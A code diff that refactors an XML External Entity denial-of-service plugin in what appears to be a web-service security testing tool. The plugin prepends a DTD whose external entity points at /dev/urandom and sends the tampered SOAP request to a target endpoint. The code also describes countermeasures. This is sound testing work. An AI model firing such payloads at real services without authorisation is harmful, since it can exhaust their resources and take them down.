@@ -18,61 +18,12 @@
  */
 package wsattacker.plugin.dos;
 
-import org.apache.xmlbeans.XmlException;
-import org.w3c.dom.Document;
-import org.w3c.dom.Node;
-import org.xml.sax.SAXException;
-
-import wsattacker.main.composition.plugin.AbstractPlugin;
-import wsattacker.main.composition.plugin.option.AbstractOption;
-import wsattacker.main.composition.plugin.option.AbstractOptionBoolean;
-import wsattacker.main.composition.plugin.option.AbstractOptionChoice;
-import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
-import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
-import wsattacker.main.composition.testsuite.RequestResponsePair;
-import wsattacker.main.plugin.PluginState;
-import wsattacker.main.plugin.option.OptionLimitedInteger;
-import wsattacker.main.plugin.option.OptionSimpleBoolean;
 import wsattacker.main.plugin.option.OptionSimpleVarchar;
-import wsattacker.main.testsuite.TestSuite;
-import wsattacker.util.SoapUtilities;
-import wsattacker.util.SortedUniqueList;
-
-import com.eviware.soapui.impl.wsdl.WsdlInterface;
-import com.eviware.soapui.impl.wsdl.WsdlOperation;
-import com.eviware.soapui.impl.wsdl.WsdlRequest;
-import com.eviware.soapui.impl.wsdl.WsdlSubmit;
-import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
-import com.eviware.soapui.impl.wsdl.support.soap.SoapUtils;
-import com.eviware.soapui.model.iface.Operation;
-import com.eviware.soapui.model.iface.Request.SubmitException;
-import com.eviware.soapui.model.iface.Response;
-import com.eviware.soapui.support.types.StringToStringMap;
 import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
 
-import wsattacker.plugin.dos.dosExtension.mvc.AttackMVC;
-
-import java.io.BufferedWriter;
-import java.io.FileWriter;
-import java.util.ArrayList;
 import java.util.HashMap;
-import java.util.Iterator;
 import java.util.Map;
-import java.util.logging.Level;
-import java.util.logging.Logger;
-import javax.xml.xpath.XPath;
-import javax.xml.xpath.XPathConstants;
-import javax.xml.xpath.XPathExpressionException;
-import javax.xml.xpath.XPathFactory;
-import org.w3c.dom.Element;
-import wsattacker.main.composition.plugin.PluginFunctionInterface;
-import wsattacker.main.plugin.option.OptionSimpleText;
-import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX31A;
-import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX33A;
-import wsattacker.plugin.dos.dosExtension.function.postanalyze.DOSPostAnalyzeFunction;
-import wsattacker.plugin.dos.dosExtension.mvc.model.AttackModel;
 import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
-import wsattacker.plugin.dos.dosExtension.util.UtilDos;
 
 public class XmlExternalEntity extends AbstractDosPlugin {
 
@@ -83,92 +34,72 @@ public class XmlExternalEntity extends AbstractDosPlugin {
     // Custom Attributes
     private OptionSimpleVarchar optionExternalEntity;
 
-
     @Override
     public void initializeDosPlugin() {
+        initData();
+        // Custom Initilisation
+        optionExternalEntity = new OptionSimpleVarchar("Path to resource", "\"/dev/urandom\"", "Be carefull with Linux/Windows/Mac system resource differences!", 400);
+        getPluginOptions().add(optionExternalEntity);
 
-	// Custom Initilisation
-	optionExternalEntity = new OptionSimpleVarchar("Param 8", "\"/dev/urandom\"", "Path to resource", 400);
-	getPluginOptions().add(optionExternalEntity);
-
-    }
-    
-    @Override 
-    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition(){
-	return OptionTextAreaSoapMessage.PayloadPosition.BODYLASTCHILDELEMENT;
-    }      
-
-    @Override
-    public String getName() {
-	return "XML External Entity Attack";
     }
 
     @Override
-    public String getDescription() {
-	    return "This attack checks whether or not a Web service is vulnerable to the \"XML External Entity\" attack.\n"
-		    + "A vulnerable Web service runs out of resources when trying to resolve an external entity.\n"
-		    + "Examples of external entities are:"
-		    + "- Large files from external servers. This will use up the bandwidth."
-		    + "- Local files e.g. /dev/random/ on a Linux machine"
-		    + "The external entity is defined in the Document Type Definition (DTD)\n"
-		    + "A detailed description of the attack can be found here: http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion"
-		    + "\n\n"
-		    + "The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below \n"
-		    + "with an attribute that uses the entity that points to the external resource.\n"
-		    + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message"	    		
-		    + "\n\n"
-		    + "Parameter 8 defines the path to the external resource."
-		    + "The default value /dev/null/ will only work on Linux bases Web services."
-		    + "\n\n";
+    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition() {
+        return OptionTextAreaSoapMessage.PayloadPosition.BODYLASTCHILDELEMENT;
     }
 
-    @Override
-    public String getCountermeasures(){
-      return "In order to counter the attack, the DTD-processing (Document Type Definitions) feature has to be disabled completly.\n"
-	      + "Apache Axis2 1.5.2 is e.g. known to be vulnerable to this attack. Current versions of Apache Axis2 are not vulnerable anymore";
-    } 
-
-    @Override
-    public String getAuthor() {
-	return "Andreas Falkenberg";
-    }
-
-    @Override
-    public String getVersion() {
-	return "1.0 / 2012-10-17";
+    public void initData() {
+        setName("XML External Entity Attack");
+        setDescription("This attack checks whether or not a Web service is vulnerable to the \"XML External Entity\" attack.\n"
+          + "A vulnerable Web service runs out of resources when trying to resolve an external entity.\n"
+          + "Examples of external entities are:"
+          + "- Large files from external servers. This will use up the bandwidth."
+          + "- Local files e.g. /dev/random/ on a Linux machine"
+          + "The external entity is defined in the Document Type Definition (DTD)\n"
+          + "A detailed description of the attack can be found here: http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion"
+          + "\n\n"
+          + "The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below \n"
+          + "with an attribute that uses the entity that points to the external resource.\n"
+          + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message"
+          + "\n\n"
+          + "Parameter 8 defines the path to the external resource."
+          + "The default value /dev/null/ will only work on Linux bases Web services."
+          + "\n\n");
+        setCountermeasures("In order to counter the attack, the DTD-processing (Document Type Definitions) feature has to be disabled completly.\n"
+          + "Apache Axis2 1.5.2 is e.g. known to be vulnerable to this attack. Current versions of Apache Axis2 are not vulnerable anymore");
     }
 
     @Override
     public void createTamperedRequest() {
 
-	// get Message 
-	String soapMessageFinal;
-	String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
+        // get Message
+        String soapMessageFinal;
+        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
 
-	// inset payload entity in envelope
-	String attribute = "&attackEntity;";
-	soapMessage = this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, attribute);
+        // inset payload entity in envelope
+        String attribute = "&attackEntity;";
+        soapMessage = this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, attribute);
 
-	// prepend DTD to message
-	StringBuilder sb = new StringBuilder();
-	sb.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
-	sb.append("<!DOCTYPE requestType [ <!ENTITY attackEntity SYSTEM " + 
-                optionExternalEntity.getValue() + ">]>");
-	sb.append(soapMessage);
-	soapMessageFinal = sb.toString();
+        // prepend DTD to message
+        StringBuilder sb = new StringBuilder();
+        sb.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
+        sb.append("<!DOCTYPE requestType [ <!ENTITY attackEntity SYSTEM "
+          + optionExternalEntity.getValue() + ">]>");
+        sb.append(soapMessage);
+        soapMessageFinal = sb.toString();
 
-	// get HeaderFields from original request, if required add custom headers - make sure to clone!
-	Map<String, String> httpHeaderMap = new HashMap<String, String>();
-	for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
-	    httpHeaderMap.put(entry.getKey(), entry.getValue());
-	}	
-	httpHeaderMap.put("Content-Type", "application/xml; charset=UTF-8");
+        // get HeaderFields from original request, if required add custom headers - make sure to clone!
+        Map<String, String> httpHeaderMap = new HashMap<String, String>();
+        for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
+            httpHeaderMap.put(entry.getKey(), entry.getValue());
+        }
+        httpHeaderMap.put("Content-Type", "application/xml; charset=UTF-8");
 
-	// write payload and header to TamperedRequestObject
-	this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);
+        // write payload and header to TamperedRequestObject
+        this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);
 
     }
     // ----------------------------------------------------------
-    // All custom DOS-Attack specific Methods below! 
+    // All custom DOS-Attack specific Methods below!
     // ----------------------------------------------------------
 }
